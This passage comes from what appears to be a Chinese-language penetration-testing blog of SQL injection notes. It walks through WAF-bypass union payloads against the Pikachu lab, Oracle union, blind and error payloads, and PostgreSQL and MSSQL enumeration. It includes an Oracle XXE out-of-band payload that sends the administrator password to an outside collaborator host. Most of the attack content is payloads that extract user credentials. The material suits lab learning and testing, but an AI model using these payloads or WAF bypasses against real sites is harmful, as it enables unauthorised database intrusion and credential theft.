class="hljs-operator">=</span>kobe&#x27;union/*/&lt;%/*/<span class="hljs-keyword">select</span><span class="hljs-number">+2</span><span class="hljs-punctuation">,</span>group_concat(table_name)<span class="hljs-variable">%20</span>from<span class="hljs-variable">%20</span>/*<span class="hljs-title">!--</span>+/*<span class="hljs-variable">%0</span>ainformation_schema.tables*/<br></code></pre></td></tr></table></figure><p>然后去注表名</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">GET /pikachu/vul/sqli/sqli_str.php?name=kobe&#x27;union<span class="hljs-comment">/*/&lt;%/*/</span><span class="hljs-keyword">select</span>+<span class="hljs-number">2</span>,group_concat(table_name)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span>%<span class="hljs-number">20</span><span class="hljs-comment">/*!--+/*%0ainformation_schema.tables*/</span><span class="hljs-comment">/*/&lt;%/*/</span><span class="hljs-keyword">where</span>+table_schema=<span class="hljs-keyword">database</span><span class="hljs-comment">/*/&lt;%/*/</span>()--+<br></code></pre></td></tr></table></figure><p>显示有一个表名为users 去注列名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-type">name</span>=kob<span class="hljs-string">e&#x27;union/*/&lt;%/*/select+2,group_concat(column_name)%20from%20/*!--+/*%0ainformation_schema.columns*//*/&lt;%/*/where+table_schema=database/*/&lt;%/*/()+and+table_name/*/&lt;%/*/=&#x27;</span>users<span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>列名有id和password等</p><p>去注数据</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">GET /pikachu/vul/sqli/sqli_str.php?name=kobe&#x27;union<span class="hljs-comment">/*/&lt;%/*/</span><span class="hljs-keyword">select</span>+<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-keyword">password</span>)%<span class="hljs-number">20</span><span class="hljs-keyword">from</span><span class="hljs-comment">/*/&lt;%/*/</span>users--+<br></code></pre></td></tr></table></figure><p>完事</p><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20250311142900706-5832854.png" alt="image-20250311142900706"></p><p>总结：</p><p>安全狗还是蛮好绕的 基本fuzz一下多行注释就能绕很多 然后再用外联注释 配合单行注释和换行符 基本上没啥问题</p><h3 id="tamper脚本化"><a href="#tamper脚本化" class="headerlink" title="tamper脚本化"></a>tamper脚本化</h3><p>如果实战碰到这种情6况 一个个注数据太麻烦了 还是整个tamper脚本配合sqlmap一类的工具比较快捷</p><h1 id="Oracle手工注入"><a href="#Oracle手工注入" class="headerlink" title="Oracle手工注入"></a>Oracle手工注入</h1><ul><li><p>注入点判断</p><ul><li>and 1&#x3D;1 和and 1&#x3D;2 或者延时函数</li></ul></li><li><p>order by 查看列数</p></li><li><p>union select null,null from dual</p><ul><li>先使用null占位 每一个列的数据类型都是单独的 需要逐个比对</li></ul></li><li><p>union select ‘null’,’null’ from dual</p></li><li><p>查看数据库版本</p></li></ul><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">&#x27;<span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> &#x27;<span class="hljs-built_in">null</span>&#x27;,(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-built_in">where</span> rownum=<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual--+<br></code></pre></td></tr></table></figure><ul><li>获取当前数据库连接用户</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,user from dual<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">select</span> sys_context(<span class="hljs-symbol">&#x27;userenv</span><span class="hljs-string">&#x27;,&#x27;</span>current_user&#x27;) from dual) from dual<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li>查询当前数据库库名</li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> v$<span class="hljs-keyword">database</span>) <span class="hljs-keyword">from</span> dual--+<br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">SELECT</span> global_name FROM global_name) from dual<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li>查询数据库表名</li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+table_name,<span class="hljs-built_in">NULL</span>+FROM+all_tables--+<br></code></pre></td></tr></table></figure><pre><code class="hljs">- bp的wp 跳出了dual的限制 好使</code></pre><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> user_tables <span class="hljs-keyword">where</span> rownum=<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual--+<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 这个有点怪 感觉查出来的不是很全？ 从user_tables表去查 rownum代表哪一行</code></pre><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>, (<span class="hljs-keyword">select</span> <span class="hljs-built_in">SUBSTR</span>(LISTAGG(table_name, <span class="hljs-string">&#x27;,&#x27;</span>) <span class="hljs-keyword">WITHIN</span> <span class="hljs-keyword">GROUP</span> (<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> table_name), <span class="hljs-number">1</span>, <span class="hljs-number">10</span>) <span class="hljs-keyword">FROM</span> all_tables <span class="hljs-keyword">WHERE</span> owner = <span class="hljs-string">&#x27;PETER&#x27;</span>) <span class="hljs-keyword">FROM</span> dual --+<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 用substr去截断长度 否则可能过长会引起问题 owner后面接着用户名</code></pre><ul><li>查询字段名</li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+column_name,<span class="hljs-literal">NULL</span>+<span class="hljs-keyword">FROM</span>+all_tab_columns+<span class="hljs-keyword">WHERE</span>+table_name=<span class="hljs-string">&#x27;USERS_ABCDEF&#x27;</span>--+<br></code></pre></td></tr></table></figure><pre><code class="hljs">- bp的wp 跳出了dual的限制 好使</code></pre><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> all_tab_columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;USERS_EXKYDO&#x27;</span> <span class="hljs-keyword">and</span> rownum=<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> dual--+<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 这个查的就是很怪 数据不全- 解决办法是 查完第一个 然后在条件里接上 and column_name not in &#39;第一个表名&#39;  其他不变 循环往复</code></pre><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>, (<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> user_tab_columns <span class="hljs-keyword">where</span> table_name=<span class="hljs-string">&#x27;USERS_EXKYDO&#x27;</span> <span class="hljs-keyword">and</span> rownum=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> column_name <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%PASS%&#x27;</span> <span class="hljs-keyword">and</span> column_name &lt;&gt; <span class="hljs-string">&#x27;USER_NAME&#x27;</span>) <span class="hljs-keyword">FROM</span> dual --+<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 模糊匹配 去匹配user USER pass PASS</code></pre><ul><li>查询数据</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;1&#x27;</span>, PASSWORD_DWMSZI from <span class="hljs-string">&quot;USERS_EXKYDO&quot;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li><a href="https://www.cnblogs.com/miruier/p/17521338.html">https://www.cnblogs.com/miruier/p/17521338.html</a></li></ul><h2 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;||(<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">FROM</span> dual)||<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>先用正常的语法 返回正常页面</li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;||(<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">not</span>-a-real-table)||<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>查询无效语法 返回错误页面</li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;||(<span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> ROWNUM = <span class="hljs-number">1</span>)||<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>where rownum 防止返回数据多于一行造成错误</li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;||(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">1</span>=<span class="hljs-number">1</span>) <span class="hljs-keyword">THEN</span> TO_CHAR(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">END</span> <span class="hljs-keyword">FROM</span> dual)||<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>返回错误消息</li><li>when 后面是判断真假</li><li>如果真则会 执行 then后面的语句</li><li>假则执行 else后面的语句</li><li>这里TO_CHAR(1&#x2F;0)会触发除零报错</li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;||(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">CASE</span> <span class="hljs-keyword">WHEN</span> (<span class="hljs-number">1</span>=<span class="hljs-number">2</span>) <span class="hljs-keyword">THEN</span> TO_CHAR(<span class="hljs-number">1</span>/<span class="hljs-number">0</span>) <span class="hljs-keyword">ELSE</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">END</span> <span class="hljs-keyword">FROM</span> dual)||<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>返回正确消息</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&#x27;||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE &#x27;</span><span class="hljs-string">&#x27; END FROM users WHERE username=&#x27;</span>administrato<span class="hljs-string">r&#x27;)||&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>where后面的语句先被执行 如果找到了username&#x3D;’administrator’，那么才会执行全部的语句导致报错</li><li>如果没有administrator存在 那么直接不继续执行了 因此不会报错</li></ul><h2 id="带外"><a href="#带外" class="headerlink" title="带外"></a>带外</h2><ul><li>xxe方式带外验证</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;<span class="hljs-meta">&lt;!DOCTYPE+root+[+<span class="hljs-meta">&lt;!ENTITY+%25+remote+SYSTEM+<span class="hljs-string">&quot;http%3a//BURP-COLLABORATOR-SUBDOMAIN/&quot;</span>&gt;</span>+%25remote%3b]&gt;</span>&#x27;),&#x27;/l&#x27;)+FROM+dual--<br></code></pre></td></tr></table></figure><ul><li>xxe方式带外数据</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span>&lt;<span class="hljs-variable">%3fxml</span>+version<span class="hljs-variable">%3d</span><span class="hljs-string">&quot;1.0&quot;</span>+encoding<span class="hljs-variable">%3d</span><span class="hljs-string">&quot;UTF-8&quot;</span><span class="hljs-variable">%3f</span>&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+<span class="hljs-variable">%25</span>+remote+SYSTEM+<span class="hljs-string">&quot;http<span class="hljs-variable">%3a</span>//&#x27;||(SELECT+password+FROM+users+WHERE+username<span class="hljs-variable">%3d</span>&#x27;administrator&#x27;)||&#x27;.xij9kdt29bhizic3xjly4ea86zcq0go5.oastify.com/&quot;</span>&gt;+<span class="hljs-variable">%2</span>5remote<span class="hljs-variable">%3b</span>]&gt;<span class="hljs-string">&#x27;),&#x27;</span>/l<span class="hljs-string">&#x27;)+FROM+dual--+</span><br></code></pre></td></tr></table></figure><h1 id="PostgreSQL手工注入"><a href="#PostgreSQL手工注入" class="headerlink" title="PostgreSQL手工注入"></a>PostgreSQL手工注入</h1><ul><li><p>注入点判断和mysql一样</p></li><li><p>order by判断列数</p></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li><p>然后逐个判断字符类型 一般加上单引号即可</p></li><li><p>获取当前数据库名</p></li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> current_database(),<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li>获取表名</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;2&#x27;</span>,table_name from information_schema.tables where table_catalog=<span class="hljs-symbol">&#x27;academy_labs</span>&#x27;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li>获取列名</li></ul><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;2&#x27;</span>,column_name from information_schema.columns where table_catalog=<span class="hljs-symbol">&#x27;academy_labs</span>&#x27; <span class="hljs-keyword">and</span> table_name=<span class="hljs-symbol">&#x27;users</span>&#x27;<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><ul><li>获取数据</li></ul><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;administrator&#x27;</span>--+<br></code></pre></td></tr></table></figure><h2 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">&#x27;||pg_sleep(<span class="hljs-number">10</span>)--+<br></code></pre></td></tr></table></figure><h2 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><ul><li>见py脚本</li></ul><h2 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h2><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27; AND 1=CAST((<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> int)--+<br></code></pre></td></tr></table></figure><ul><li>类型转换报错 回显错误信息</li></ul><h1 id="MSSQL手工注入"><a href="#MSSQL手工注入" class="headerlink" title="MSSQL手工注入"></a>MSSQL手工注入</h1><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="服务器级的固定角色"><a href="#服务器级的固定角色" class="headerlink" title="服务器级的固定角色"></a>服务器级的固定角色</h3><table><thead><tr><th align="left">服务器级的固定角色</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">sysadmin</td><td align="left">sysadmin 固定服务器角色的成员可以在服务器上执行任何活动。</td></tr><tr><td align="left">serveradmin</td><td align="left">serveradmin 固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器。</td></tr><tr><td align="left">securityadmin</td><td align="left">securityadmin 固定服务器角色的成员可以管理登录名及其属性。 他们可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 服务器级权限。 他们还可以 <code>GRANT</code>、<code>DENY</code> 和 <code>REVOKE</code> 数据库级权限（如果他们具有数据库的访问权限）。 此外，他们还可以重置 SQL Server 登录名的密码。 重要说明： 如果能够授予对 数据库引擎 的访问权限和配置用户权限，安全管理员可以分配大多数服务器权限。 securityadmin 角色应视为与 sysadmin 角色等效。</td></tr><tr><td align="left">processadmin</td><td align="left">processadmin 固定服务器角色的成员可以终止在 SQL Server 实例中运行的进程。</td></tr><tr><td align="left">setupadmin</td><td align="left">setupadmin 固定服务器角色的成员可以使用 Transact-SQL 语句添加和删除链接服务器。 （使用 Management Studio 时需要 sysadmin 成员资格。）</td></tr><tr><td align="left">bulkadmin</td><td align="left">bulkadmin 固定服务器角色的成员可以运行 <code>BULK INSERT</code> 语句。</td></tr><tr><td align="left">diskadmin</td><td align="left">diskadmin 固定服务器角色用于管理磁盘文件。</td></tr><tr><td align="left">dbcreator</td><td align="left">dbeator 固务器角色的成员可以创建、更改、删除和还原任何数据库。</td></tr><tr><td align="left">puic</td><td align="left">每个 SQL Server 登录名都属于 public 服务器角色。 如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限，该用户将继承授予该对象的 public 角色的权限。 只有在希望所有用户都能使用对象时，才在对象上分配 Public 权限。 你无法更改具有 Public 角色的成员身份。 注意plic 与其他角色的实现方式不同，可通过 public 固定服务器角色授予、拒绝或调用权限。</td></tr></tbody></table><h3 id="固定数据库角色名"><a href="#固定数据库角色名" class="headerlink" title="固定数据库角色名"></a>固定数据库角色名</h3><table><thead><tr><th align="left">固定数据库角色名</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">db_owner</td><td align="left">db_owner 固定数据库角色的成员可以执行数据库的所有配置和维护活动，还可以删除 SQL Server中的数据库。 （在 SQL 数据库 和 SQL 数据仓库中，某些维护活动需要服务器级别权限，并且不能由 db_owners执行。）</td></tr><tr><td align="left">db_securityadmin</td><td align="left">db_securityadmin 固定数据库角色的成员可以仅修改自定义角色的角色成员资格、创建无登录名的用户和管理权限。 向此角色中添加主体可能会导致意外的权限升级。</td></tr><tr><td align="left">db_accessadmin</td><td align="left">db_accessadmin 固定数据库角色的成员可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限。</td></tr><tr><td align="left">db_backupoperator</td><td align="left">db_backupoperator 固定数据库角色的成员可以备份数据库。</td></tr><tr><td align="left">db_ddladmin</td><td align="left">db_ddladmin 固定数据库角色的成员可以在数据库中运行任何数据定义语言 (DDL) 命令。</td></tr><tr><td align="left">db_datawriter</td><td align="left">db_datawriter 固定数据库角色的成员可以在所有用户表中添加、删除或更改数据。</td></tr><tr><td align="left">db_datareader</td><td align="left">db_datareader 固定数据库角色的成员可以从所有用户表中读取所有数据。</td></tr><tr><td align="left">db_denydatawriter</td><td align="left">db_denydatawriter 固定数据库角色的成员不能添加、修改或删除数据库内用户表中的任何数据。</td></tr><tr><td align="left">db_denydatareader</td><td align="left">db_denydatareader 固定数据库角色的成员不能读取数据库内用户表中的任何数据。</td></tr></tbody></table><h3 id="判断服务器级别的固定角色方法"><a href="#判断服务器级别的固定角色方法" class="headerlink" title="判断服务器级别的固定角色方法"></a>判断服务器级别的固定角色方法</h3><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-number">1</span>=(<span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">is_srvrolemember</span>(<span class="hljs-string">&#x27;sysadmin&#x27;</span>))</span><br><br><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-number">1</span>=(<span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">is_srvrolemember</span>(<span class="hljs-string">&#x27;serveradmin&#x27;</span>))</span><br><br><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-number">1</span>=(<span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">is_srvrolemember</span>(<span class="hljs-string">&#x27;setupadmin&#x27;</span>))</span><br><br><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-number">1</span>=(<span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">is_srvrolemember</span>(<span class="hljs-string">&#x27;securityadmin&#x27;</span>))</span><br><br><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-number">1</span>=(<span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">is_srvrolemember</span>(<span class="hljs-string">&#x27;diskadmin&#x27;</span>))</span><br><br><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-number">1</span>=(<span class="hljs-variable">select</span> <span class="hljs-function"><span class="hljs-title">is_srvrolemember</span>(<span class="hljs-string">&#x27;bulkadmin&#x27;</span>))</span><br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">返回值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">0</td><td align="left">login 不是 role 的成员。</td></tr><tr><td align="left">1</td><td align="left">login 是 role 的成员。</td></tr><tr><td align="left">NULL</td><td align="left">role 或 login 无效，或者没有查看角色成员身份的权限。</td></tr></tbody></table><h3 id="判断数据库级别的"><a href="#判断数据库级别的" class="headerlink" title="判断数据库级别的"></a>判断数据库级别的</h3><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">and</span></span> <span class="hljs-number">1</span>=(<span class="hljs-variable">SELECT</span> <span class="hljs-function"><span class="hljs-title">IS_MEMBER</span>(<span class="hljs-string">&#x27;db_owner&#x27;</span>))</span><br></code></pre></td></tr></table></figure><h3 id="其他基本信息"><a href="#其他基本信息" class="headerlink" title="其他基本信息"></a>其他基本信息</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">SELECT</span> <span class="hljs-comment">@@</span>version; <span class="hljs-comment">//版本</span><br><span class="hljs-built_in">SELECT</span> user;    <span class="hljs-comment">//用户</span><br><span class="hljs-built_in">SELECT</span> <span class="hljs-built_in">DB_NAME</span>(); <span class="hljs-comment">//当前数据库名，你可以用db_name(n)来遍历出所有的数据库</span><br><span class="hljs-built_in">SELECT</span> <span class="hljs-comment">@@</span>servername;  <span class="hljs-comment">//主机名</span><br><span class="hljs-built_in">select</span> * from user <span class="hljs-built_in">where</span> id=&#x27;<span class="hljs-number">1</span>&#x27;<span class="hljs-keyword">and</span> <span class="hljs-built_in">host_name</span>()=<span class="hljs-comment">@@</span>servername;--&#x27; <span class="hljs-comment">//判断站库分离</span><br></code></pre></td></tr></table></figure><h3 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">/* <br>--（单行注释）<br><span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure><h3 id="空白字符"><a href="#空白字符" class="headerlink" title="空白字符"></a>空白字符</h3><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">01,02,03,04</span>,<span class="hljs-number">05,06,07,08</span>,<span class="hljs-number">09</span>,<span class="hljs-number">0</span><span class="hljs-keyword">A</span>,<span class="hljs-number">0</span>B,<span class="hljs-number">0</span>C,<span class="hljs-number">0</span>D,<span class="hljs-number">0</span>E,<span class="hljs-number">0</span>F,<span class="hljs-number">10,11,12,13</span>,<span class="hljs-number">14,15,16,17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">1</span><span class="hljs-keyword">A</span>,<span class="hljs-number">1</span>B,<span class="hljs-number">1</span>C,<span class="hljs-number">1</span>D,<span class="hljs-number">1</span>E,<span class="hljs-number">1</span>F,<span class="hljs-number">20</span> --暂时不了解为什么<br><br>/**/<br></code></pre></td></tr></table></figure><h3 id="运算字符"><a href="#运算字符" class="headerlink" title="运算字符"></a>运算字符</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">--基本的不列举了，举几个特殊的</span><br><span class="hljs-keyword">ALL</span> 如果一组的比较都为<span class="hljs-literal">true</span>，则比较结果为<span class="hljs-literal">true</span>  <span class="hljs-keyword">ALL</span>只能接有效的子查询<br><span class="hljs-keyword">AND</span> 如果两个布尔表达式都为<span class="hljs-literal">true</span>，则结果为<span class="hljs-literal">true</span>；如果其中一个表达式为<span class="hljs-literal">false</span>，则结果为<span class="hljs-literal">false</span><br><span class="hljs-keyword">ANY</span> 如果一组的比较中任何一个为<span class="hljs-literal">true</span>，则结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">BETWEEN</span> 如果操作数在某个范围之内，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">EXISTS</span>  如果子查询中包含了一些行，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">IN</span>  如果操作数等于表达式列表中的一个，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">LIKE</span>    如果操作数与某种模式相匹配，那么结果为<span class="hljs-literal">true</span><br><span class="hljs-keyword">NOT</span> 对任何其他布尔运算符的结果值取反<br><span class="hljs-keyword">OR</span>  如果两个布尔表达式中的任何一个为<span class="hljs-literal">true</span>，那么结果为<span class="hljs-literal">true</span><br><span 